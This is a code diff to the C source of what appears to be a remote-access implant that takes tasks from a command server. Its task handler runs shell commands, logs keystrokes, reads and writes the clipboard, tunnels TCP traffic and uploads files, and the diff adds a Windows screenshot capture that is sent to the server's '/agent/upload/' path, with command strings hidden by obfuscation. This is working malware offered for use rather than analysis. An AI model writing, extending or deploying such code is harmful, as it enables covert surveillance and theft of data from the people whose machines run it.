@@ -404,21 +404,11 @@ cJSON *sysinfo(){
   return info;
 }
 
-short int upload_file(char *url, char *filename, FILE *rfo, buffer *result_buff){
+short int upload_file(char *url, char *filename, size_t file_size, FILE *rfo, buffer *result_buff){
 
-  char strs[][40] = {"[OBFS_ENC]Error getting file size!", "[OBFS_ENC]File is empty!", "[OBFS_ENC]File too large!", "[OBFS_ENC]file", "[OBFS_ENC]filename"};
-  for (int i = 0; i < 5; i++)
+  char strs[][40] = {"[OBFS_ENC]File too large!", "[OBFS_ENC]file", "[OBFS_ENC]filename"};
+  for (int i = 0; i < 3; i++)
     obfs_decode(strs[i]);
-  struct stat st;
-  if (stat(filename, &st)){
-    buffer_strcpy(result_buff, strs[0]);
-    return 1;
-  }
-  size_t file_size = st.st_size;
-  if (!file_size){
-    buffer_strcpy(result_buff, strs[1]);
-    return 1;
-  }
   #ifdef IS_LINUX
     buffer *body = create_buffer(0);
     CURL *curl = curl_easy_init();
@@ -434,10 +424,10 @@ short int upload_file(char *url, char *filename, FILE *rfo, buffer *result_buff)
     curl_mimepart *field;
     form = curl_mime_init(curl);
     field = curl_mime_addpart(form);
-    curl_mime_name(field, strs[3]);
+    curl_mime_name(field, strs[1]);
     curl_mime_filedata(field, filename);
     field = curl_mime_addpart(form);
-    curl_mime_name(field, strs[4]);
+    curl_mime_name(field, strs[2]);
     curl_mime_data(field, filename, CURL_ZERO_TERMINATED);
     curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);
     res = curl_easy_perform(curl);
@@ -453,7 +443,7 @@ short int upload_file(char *url, char *filename, FILE *rfo, buffer *result_buff)
     return 0;
   #else
     if (file_size > MAX_UPLOAD_SIZE){
-      buffer_strcpy(result_buff, strs[2]);
+      buffer_strcpy(result_buff, strs[0]);
       return 1;
     }
     char form_strs[][76] = {"[OBFS_ENC]----WebKitFormBoundary", "[OBFS_ENC]Content-Type: multipart/form-data; boundary=", "[OBFS_ENC]\r\nContent-Length: ", "[OBFS_ENC]\r\nContent-Disposition: form-data; name=\"file\"; filename=\"", "[OBFS_ENC]\"\r\nContent-Type: application/octet-stream\r\n\r\n"};
@@ -1271,6 +1261,104 @@ int clipwrite(char *buff){
   return 0;
 }
 
+// Source: https://stackoverflow.com/questions/3291167/how-can-i-take-a-screenshot-in-a-windows-application
+FILE *screenshot(){
+  
+  FILE *fo = tmpfile();
+  if (!fo)
+    return NULL;
+  #ifdef IS_WINDOWS
+    int x = GetSystemMetrics(SM_XVIRTUALSCREEN);
+    int y = GetSystemMetrics(SM_YVIRTUALSCREEN);
+    int cx = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+    int cy = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+    int width = cx - x;
+    int height = cy - y;
+    HDC dcScreen = GetDC(0);
+    HDC dcTarget = CreateCompatibleDC(dcScreen);
+    HBITMAP bmpTarget = CreateCompatibleBitmap(dcScreen, width, height);
+    HGDIOBJ oldBmp = SelectObject(dcTarget, bmpTarget);
+    BitBlt(dcTarget, 0, 0, cx, cy, dcScreen, x, y, SRCCOPY | CAPTUREBLT);
+    SelectObject(dcTarget, oldBmp);
+    bitmapToFile(bmpTarget, fo);
+    DeleteDC(dcTarget);
+    ReleaseDC(GetConsoleWindow(), dcScreen);
+  #else
+    // Coming soon...
+    fclose(fo);
+    fo = NULL;
+  #endif
+  return fo;
+}
+
+#ifdef IS_WINDOWS
+  // Source: https://stackoverflow.com/questions/24720451/save-hbitmap-to-bmp-file-using-only-win32
+  int bitmapToFile(HBITMAP hBitmap, FILE *wfo){
+    
+    HDC hDC;
+    int iBits;
+    WORD wBitCount;
+    DWORD dwPaletteSize = 0, dwBmBitsSize = 0, dwDIBSize = 0;
+    BITMAP Bitmap0;
+    BITMAPFILEHEADER bmfHdr;
+    BITMAPINFOHEADER bi;
+    LPBITMAPINFOHEADER lpbi;
+    HANDLE hDib, hPal, hOldPal2 = NULL;
+    hDC = CreateDC(TEXT("DISPLAY"), NULL, NULL, NULL);
+    iBits = GetDeviceCaps(hDC, BITSPIXEL) * GetDeviceCaps(hDC, PLANES);
+    DeleteDC(hDC);
+    if (iBits <= 1)
+      wBitCount = 1;
+    else if (iBits <= 4)
+      wBitCount = 4;
+    else if (iBits <= 8)
+      wBitCount = 8;
+    else
+      wBitCount = 24;
+    GetObject(hBitmap, sizeof(Bitmap0), (LPSTR)&Bitmap0);
+    bi.biSize = sizeof(BITMAPINFOHEADER);
+    bi.biWidth = Bitmap0.bmWidth;
+    bi.biHeight = -Bitmap0.bmHeight;
+    bi.biPlanes = 1;
+    bi.biBitCount = wBitCount;
+    bi.biCompression = BI_RGB;
+    bi.biSizeImage = 0;
+    bi.biXPelsPerMeter = 0;
+    bi.biYPelsPerMeter = 0;
+    bi.biClrImportant = 0;
+    bi.biClrUsed = 256;
+    dwBmBitsSize = ((Bitmap0.bmWidth * wBitCount + 31) & ~31) / 8 * Bitmap0.bmHeight;
+    hDib = GlobalAlloc(GHND, dwBmBitsSize + dwPaletteSize + sizeof(BITMAPINFOHEADER));
+    lpbi = (LPBITMAPINFOHEADER)GlobalLock(hDib);
+    *lpbi = bi;
+
+    hPal = GetStockObject(DEFAULT_PALETTE);
+    if (hPal){
+      hDC = GetDC(NULL);
+      hOldPal2 = SelectPalette(hDC, (HPALETTE)hPal, FALSE);
+      RealizePalette(hDC);
+    }
+    GetDIBits(hDC, hBitmap, 0, (UINT)Bitmap0.bmHeight, (LPSTR)lpbi + sizeof(BITMAPINFOHEADER) + dwPaletteSize, (BITMAPINFO *)lpbi, DIB_RGB_COLORS);
+    if (hOldPal2){
+      SelectPalette(hDC, (HPALETTE)hOldPal2, TRUE);
+      RealizePalette(hDC);
+      ReleaseDC(NULL, hDC);
+    }
+
+    bmfHdr.bfType = 0x4D42;
+    dwDIBSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwPaletteSize + dwBmBitsSize;
+    bmfHdr.bfSize = dwDIBSize;
+    bmfHdr.bfReserved1 = 0;
+    bmfHdr.bfReserved2 = 0;
+    bmfHdr.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER) + dwPaletteSize;
+    fwrite((LPSTR)&bmfHdr, 1, strlen((LPSTR)&bmfHdr), wfo);
+    fwrite((LPSTR)lpbi, 1, dwDIBSize, wfo);
+    GlobalUnlock(hDib);
+    GlobalFree(hDib);
+    return 0;
+  }
+#endif
+
 task *parse_task(cJSON *json){
 
   char strs[][20] = {"[OBFS_ENC]uid", "[OBFS_ENC]taskType", "[OBFS_ENC]data"};
@@ -1312,7 +1400,7 @@ DWORD WINAPI task_executor(LPVOID ptr)
   #endif
   cJSON *data = tsk->data;
   buffer *result_buff = create_buffer(0);
-  char cmd_strs[][30] = {"[OBFS_ENC]system", "[OBFS_ENC]download", "[OBFS_ENC]upload", "[OBFS_ENC]writedir", "[OBFS_ENC]keymon", "[OBFS_ENC]abort", "[OBFS_ENC]delay", "[OBFS_ENC]cd", "[OBFS_ENC]kill", "[OBFS_ENC]tunnel", "[OBFS_ENC]bridge", "[OBFS_ENC]webload", "[OBFS_ENC]clipread", "[OBFS_ENC]clipwrite"};
+  char cmd_strs[][30] = {"[OBFS_ENC]system", "[OBFS_ENC]download", "[OBFS_ENC]upload", "[OBFS_ENC]keymon", "[OBFS_ENC]abort", "[OBFS_ENC]delay", "[OBFS_ENC]cd", "[OBFS_ENC]kill", "[OBFS_ENC]tunnel", "[OBFS_ENC]bridge", "[OBFS_ENC]webload", "[OBFS_ENC]clipread", "[OBFS_ENC]clipwrite", "[OBFS_ENC]screenshot"};
   for (int i = 0; i < 14; i++)
     obfs_decode(cmd_strs[i]);
   if (!strcmp(tsk->type, cmd_strs[0])){ // Run a shell command.
@@ -1348,10 +1436,16 @@ DWORD WINAPI task_executor(LPVOID ptr)
       buffer_strcpy(result_buff, strs[1]);
       goto complete;
     }
+    struct stat st;
+    if (stat(filename, &st)){
+      buffer_strcpy(result_buff, strs[1]);
+      goto complete;
+    }
+    size_t file_size = st.st_size;
     char *url = malloc(URL_SIZE);
     if (snprintf(url, URL_SIZE, strs[2], BASE_URL, striker->uid, tsk->uid) < 0)
       abort();
-    if (!upload_file(url, filename, rfo, result_buff))
+    if (!upload_file(url, filename, file_size, rfo, result_buff))
       tsk->successful = 1;
     fclose(rfo);
     free(url);
@@ -1378,24 +1472,7 @@ DWORD WINAPI task_executor(LPVOID ptr)
       append_buffer(result_buff, name, strlen(name));
     }
     free(url);
-  }else if (!strcmp(tsk->type, cmd_strs[3])){ // Change write directory.
-    char strs[][40] = {"[OBFS_ENC]dir", "[OBFS_ENC]Changed write directory!"};
-    for (int i = 0; i < 2; i++)
-      obfs_decode(strs[i]);
-    char *dir = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, strs[0]));
-    int len = strlen(dir);
-    strncpy(striker->write_dir, dir, PATH_MAX);
-    if (dir[len - 1] != '/' && dir[len - 1] != '\\'){
-      #ifdef IS_LINUX
-      striker->write_dir[len] = '/';
-      #else
-      striker->write_dir[len] = '\\';
-      #endif
-      striker->write_dir[len + 1] = '\0';
-    }
-    buffer_strcpy(result_buff, strs[1]);
-    tsk->successful = 1;
-  }else if (!strcmp(tsk->type, cmd_strs[4])){ // Start a keylogger.
+  }else if (!strcmp(tsk->type, cmd_strs[3])){ // Start a keylogger.
     char msg[] = "[OBFS_ENC]keymon is already running!";
     if (keymon_active){
       buffer_strcpy(result_buff, obfs_decode(msg));
@@ -1403,17 +1480,17 @@ DWORD WINAPI task_executor(LPVOID ptr)
       keymon(striker, tsk);
       tsk->successful = 1;      
     }
-  }else if (!strcmp(tsk->type, cmd_strs[5])){ // Abort the session.
+  }else if (!strcmp(tsk->type, cmd_strs[4])){ // Abort the session.
     char msg[] = "[OBFS_ENC]Session aborted!";
     buffer_strcpy(result_buff, obfs_decode(msg));
     tsk->successful = 1;
     striker->abort = 1;
-  }else if (!strcmp(tsk->type, cmd_strs[6])){ // Update callback delay.
+  }else if (!strcmp(tsk->type, cmd_strs[5])){ // Update callback delay.
     char msg[] = "[OBFS_ENC]Callback delay updated!";
-    striker->delay = cJSON_GetNumberValue(cJSON_GetObjectItemCaseSensitive(data, cmd_strs[6]));
+    striker->delay = cJSON_GetNumberValue(cJSON_GetObjectItemCaseSensitive(data, cmd_strs[5]));
     buffer_strcpy(result_buff, obfs_decode(msg));
     tsk->successful = 1;
-  }else if (!strcmp(tsk->type, cmd_strs[7])){ // Change working directory
+  }else if (!strcmp(tsk->type, cmd_strs[6])){ // Change working directory
     char strs[][50] = {"[OBFS_ENC]Error changing working directory!", "[OBFS_ENC]dir"};
     if (chdir(cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, obfs_decode(strs[1]))))){
       buffer_strcpy(result_buff, obfs_decode(strs[0]));
@@ -1424,7 +1501,7 @@ DWORD WINAPI task_executor(LPVOID ptr)
       free(new_dir);
       tsk->successful = 1;
     }
-  }else if (!strcmp(tsk->type, cmd_strs[8])){ // Signal a running task to abort.
+  }else if (!strcmp(tsk->type, cmd_strs[7])){ // Signal a running task to abort.
     char strs[][30] = {"[OBFS_ENC]uid", "[OBFS_ENC]Invalid task!", "[OBFS_ENC]Abort signal set!"};
     char *targetID = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, obfs_decode(strs[0])));
     for (int i = 0; i < striker->tasks->count; i++){
@@ -1436,7 +1513,7 @@ DWORD WINAPI task_executor(LPVOID ptr)
       }
     }
     buffer_strcpy(result_buff, (tsk->successful ? obfs_decode(strs[2]) : obfs_decode(strs[1])));
-  }else if (!strcmp(tsk->type, cmd_strs[9])){ // Create a TCP tunnel.
+  }else if (!strcmp(tsk->type, cmd_strs[8])){ // Create a TCP tunnel.
     char strs[][34] = {"[OBFS_ENC]lhost", "[OBFS_ENC]lport", "[OBFS_ENC]rhost", "[OBFS_ENC]rport", "[OBFS_ENC]Error starting tunnel!", "[OBFS_ENC]Tunnel closed!"};
     char *lhost = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, obfs_decode(strs[0])));
     int lport = cJSON_GetNumberValue(cJSON_GetObjectItemCaseSensitive(data, obfs_decode(strs[1])));
@@ -1448,7 +1525,7 @@ DWORD WINAPI task_executor(LPVOID ptr)
       buffer_strcpy(result_buff, obfs_decode(strs[5]));
       tsk->successful = 1;
     }
-  }else if (!strcmp(tsk->type, cmd_strs[10])){ // Create a TCP bridge
+  }else if (!strcmp(tsk->type, cmd_strs[9])){ // Create a TCP bridge
     char strs[][30] = {"[OBFS_ENC]host1", "[OBFS_ENC]port1", "[OBFS_ENC]host2", "[OBFS_ENC]port2", "[OBFS_ENC]Bridge closed!"};
     char *host1 = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, obfs_decode(strs[0])));
     int port1 = cJSON_GetNumberValue(cJSON_GetObjectItemCaseSensitive(data, obfs_decode(strs[1])));
@@ -1457,7 +1534,7 @@ DWORD WINAPI task_executor(LPVOID ptr)
     tcp_bridge(striker, tsk, host1, port1, host2, port2);
     buffer_strcpy(result_buff, obfs_decode(strs[4]));
     tsk->successful = 1;
-  }else if (!strcmp(tsk->type, cmd_strs[11])){ // Download a file from a URL
+  }else if (!strcmp(tsk->type, cmd_strs[10])){ // Download a file from a URL
     char strs[][30] = {"[OBFS_ENC]url", "[OBFS_ENC]file", "[OBFS_ENC]Error opening file!", "[OBFS_ENC]File downloaded!", "[OBFS_ENC]Download failed!"};
     char *url = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, obfs_decode(strs[0])));
     char *filename = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, obfs_decode(strs[1])));
@@ -1471,7 +1548,7 @@ DWORD WINAPI task_executor(LPVOID ptr)
         buffer_strcpy(result_buff, obfs_decode(strs[3]));
       fclose(wfo);
     }
-  }else if (!strcmp(tsk->type, cmd_strs[12])){ // Read from clipboard
+  }else if (!strcmp(tsk->type, cmd_strs[11])){ // Read from clipboard
     char err[] = "[OBFS_ENC]Error reading clipboard!";
     char *buff = malloc(MAX_CLIPBOARD_SIZE + 1);
     if (clipread(buff, MAX_CLIPBOARD_SIZE)){
@@ -1481,7 +1558,7 @@ DWORD WINAPI task_executor(LPVOID ptr)
       tsk->successful = 1;
     }
     free(buff);
-  }else if (!strcmp(tsk->type, cmd_strs[13])){ // Write to clipboard
+  }else if (!strcmp(tsk->type, cmd_strs[12])){ // Write to clipboard
     char strs[][40] = {"[OBFS_ENC]Error writing to clipboard!", "[OBFS_ENC]Text written!"};
     char *text = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, "text"));
     if (clipwrite(text)){
@@ -1490,6 +1567,31 @@ DWORD WINAPI task_executor(LPVOID ptr)
       buffer_strcpy(result_buff, obfs_decode(strs[1]));
       tsk->successful = 1;
     }
+  }else if (!strcmp(tsk->type, cmd_strs[13])){ // Take a screenshot
+    char strs[][40] = {"[OBFS_ENC]Error taking screenshot!", "[OBFS_ENC]Error uploading screenshot!", "[OBFS_ENC]Screenshot captured: ", "[OBFS_ENC]screenshot-", "[OBFS_ENC]%s/agent/upload/%s/%s"};
+    FILE *fo = screenshot();
+    if (!fo){
+      buffer_strcpy(result_buff, obfs_decode(strs[0]));
+      goto complete;
+    }
+    size_t file_size = ftell(fo);
+    rewind(fo);
+    printf("pos: %ld\n", ftell(fo));
+    char *filename = malloc(50);
+    snprintf(filename, 50, "%s%ld.bmp", obfs_decode(strs[3]), (unsigned long)time(NULL));
+    printf("Screenshot file: %s\n", filename);
+    char *upload_url = malloc(1024);
+    snprintf(upload_url, 1024, obfs_decode(strs[4]), BASE_URL, striker->uid, tsk->uid);
+    printf("Uploading screenshot to: %s\n", upload_url);
+    if (upload_file(upload_url, filename, file_size, fo, result_buff)){
+      buffer_strcpy(result_buff, obfs_decode(strs[1]));
+    }else{
+      buffer_strcpy(result_buff, obfs_decode(strs[2]));
+      append_buffer(result_buff, filename, strlen(filename));
+      tsk->successful = 1;
+    }
+    free(upload_url);
+    free(filename);
   }else{
     char msg[] = "[OBFS_ENC]Not implemented!";
     buffer_strcpy(result_buff, obfs_decode(msg));
@@ -1540,15 +1642,6 @@ void start_session(){
   striker->delay = atoi(DELAY);
   if (striker->delay == 0)
     striker->delay = 10;
-  striker->write_dir = malloc(PATH_MAX);
-  #ifdef IS_LINUX
-  strncpy(striker->write_dir, strs[0], PATH_MAX);
-  #else
-  char *publicDir = getenv("PUBLIC");
-  strncpy(striker->write_dir, publicDir, strlen(publicDir) + 2);
-  striker->write_dir[strlen(publicDir)] = '\\';
-  striker->write_dir[strlen(publicDir) + 1] = '\0';
-  #endif
   striker->abort = 0;
   char *tmp;
 
@@ -1793,7 +1886,6 @@ void cleanup_session(session *striker){
 
   free(striker->uid);
   free(striker->auth_key);
-  free(striker->write_dir);
   free(striker);
 }
 
